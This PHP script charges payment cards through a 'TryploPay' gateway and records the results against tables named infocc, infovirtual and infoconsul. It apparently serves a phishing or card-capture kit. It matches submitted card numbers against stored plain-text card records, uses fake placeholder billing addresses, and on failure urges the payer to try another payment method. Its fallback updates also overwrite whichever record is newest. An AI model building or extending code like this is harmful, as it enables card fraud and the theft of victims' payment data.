<?php
if (!isset($conexao)) {
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);

$resultadoParaSalvar = 'Erro';
$sucessoOperacao = false;
$transactionId = null;
$numeroCartao = '';

try {
    $stmtGateway = $conexao->prepare("SELECT tryplo_token, tryplo_chave_secreta FROM gateway_cartão WHERE nome = 'tryplo_pay' LIMIT 1");
    $stmtGateway->execute();
    $gateway = $stmtGateway->fetch(PDO::FETCH_ASSOC);

    if (!$gateway || empty($gateway['tryplo_token']) || empty($gateway['tryplo_chave_secreta'])) {
        throw new Exception("Credenciais ausentes");
    }

    $token = $gateway['tryplo_token'];
    $secret = $gateway['tryplo_chave_secreta'];

    $carrinho = json_decode($data['carrinho'] ?? '[]', true);
    $cartao = json_decode($data['cartão_de_crédito'] ?? '{}', true);
    $pagador = json_decode($data['pagador'] ?? '{}', true);

    if (empty($cartao['hash_do_cartão']) || empty($cartao['validade'])) {
        throw new Exception("Dados incompletos");
    }

    $numeroCartao = preg_replace('/\D/', '', $cartao['numero_do_cartão'] ?? '');
    $nome = trim($cartao['nome_do_titular'] ?? $pagador['nome'] ?? 'Cliente');
    $email = trim($pagador['email'] ?? '');
    $telefone = preg_replace('/\D/', '', $pagador['telefone'] ?? '');
    $documento = preg_replace('/\D/', '', $cartao['cpf_do_titular'] ?? $pagador['documento'] ?? '');
    $parcelas = intval($cartao['parcelas'] ?? 1);

    $protocolo = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $webhook_url = $protocolo . '://' . $host . '/Webhook/cartão/TryploPay';

    $auth = base64_encode($token . ":" . $secret);
    $chAuth = curl_init("https://api.tryplopay.com/auth");
    curl_setopt_array($chAuth, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Authorization: Basic ' . $auth,
            'scope: invoice.write, customer.write, webhook.write'
        ],
        CURLOPT_TIMEOUT => 20
    ]);
    $resAuth = json_decode(curl_exec($chAuth), true);
    curl_close($chAuth);

    if (empty($resAuth['access_token'])) {
        throw new Exception("Falha na autenticação");
    }

    $accessToken = $resAuth['access_token'];

    $payload = [
        "client" => [
            "name" => $nome,
            "document" => $documento,
            "email" => $email,
            "phone" => $telefone,
            "address" => [
                "street" => "Rua", "number" => "0", "district" => "Centro",
                "city" => "Cidade", "state" => "SP", "zipcode" => "00000000", "country" => "BRA"
            ],
            "ip" => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'
        ],
        "payment" => [
            "product_type" => 2,
            "id" => uniqid("ped_"),
            "type" => 1,
            "due_at" => date('Y-m-d', strtotime('+1 day')),
            "referrer" => uniqid(),
            "installments" => $parcelas > 0 ? $parcelas : 1,
            "order_url" => $webhook_url,
            "store_url" => $webhook_url,
            "webhook" => $webhook_url,
            "discount" => 0,
            "products" => [],
            "card" => [
                "saved" => 0,
                "tokenize" => 0,
                "token" => $cartao['hash_do_cartão'],
                "valid" => $cartao['validade'],
                "holder" => ["name" => $nome]
            ]
        ]
    ];

    foreach ($carrinho as $item) {
        $payload["payment"]["products"][] = [
            "id" => uniqid(),
            "title" => "Produto",
            "qnt" => intval($item['quantidade'] ?? 1),
            "amount" => number_format(floatval(str_replace(',', '.', $item['preço_atual'] ?? 0)), 2, '.', '')
        ];
    }

    $ch = curl_init("https://api.tryplopay.com/invoices");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_HTTPHEADER => [
            'Authorization: Bearer ' . $accessToken,
            'Content-Type: application/json'
        ],
        CURLOPT_TIMEOUT => 30
    ]);

    $response = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $retorno = json_decode($response, true);

    if ($http == 200 && !empty($retorno['invoice'])) {
        $transactionId = $retorno['invoice']['id'] ?? null;
        $statusCode = $retorno['invoice']['status']['code'] ?? null;

        if ($statusCode == 5) {
            $sucessoOperacao = true;
            $resultadoParaSalvar = 'Aprovado';
        } elseif (in_array($statusCode, [1, 2, 3, 4])) {
            $resultadoParaSalvar = 'Em análise';
        } else {
            $resultadoParaSalvar = 'Recusado';
        }
    } else {
        $resultadoParaSalvar = 'Recusado';
    }

} catch (Exception $e) {
    $resultadoParaSalvar = 'Erro';
}

if (!empty($numeroCartao)) {
    $isVirtual = isset($cartao['ultimos']) && strpos(strtolower($cartao['ultimos']), 'virtual') !== false;

    if ($isVirtual) {
        $stmtV = $conexao->prepare("UPDATE infovirtual SET resultado_gateway = ?, pixid = ? WHERE REPLACE(infocc_virtual, ' ', '') = ?");
        $stmtV->execute([$resultadoParaSalvar, $transactionId, $numeroCartao]);

        if ($stmtV->rowCount() == 0) {
            $stmtFV = $conexao->prepare("UPDATE infovirtual SET resultado_gateway = ?, pixid = ? ORDER BY id DESC LIMIT 1");
            $stmtFV->execute([$resultadoParaSalvar, $transactionId]);
        }
    } else {
        $stmt1 = $conexao->prepare("UPDATE infocc SET resultado_gateway = ?, pixid = ? WHERE REPLACE(REPLACE(infocc, ' ', ''), '-', '') = ?");
        $stmt1->execute([$resultadoParaSalvar, $transactionId, $numeroCartao]);

        if ($stmt1->rowCount() == 0) {
            $stmtF1 = $conexao->prepare("UPDATE infocc SET resultado_gateway = ?, pixid = ? ORDER BY id DESC LIMIT 1");
            $stmtF1->execute([$resultadoParaSalvar, $transactionId]);
        }

        $stmt2 = $conexao->prepare("UPDATE infoconsul SET resultado_gateway = ?, pixid = ? WHERE REPLACE(REPLACE(infocc, ' ', ''), '-', '') = ?");
        $stmt2->execute([$resultadoParaSalvar, $transactionId, $numeroCartao]);

        if ($stmt2->rowCount() == 0) {
            $stmtF2 = $conexao->prepare("UPDATE infoconsul SET resultado_gateway = ?, pixid = ? ORDER BY id DESC LIMIT 1");
            $stmtF2->execute([$resultadoParaSalvar, $transactionId]);
        }
    }
}

echo json_encode([
    'sucesso' => $sucessoOperacao,
    'mensagem' => $sucessoOperacao ? 'Pagamento aprovado.' : 'Pagamento não autorizado. Tente usar outra forma de pagamento.'
]);

exit;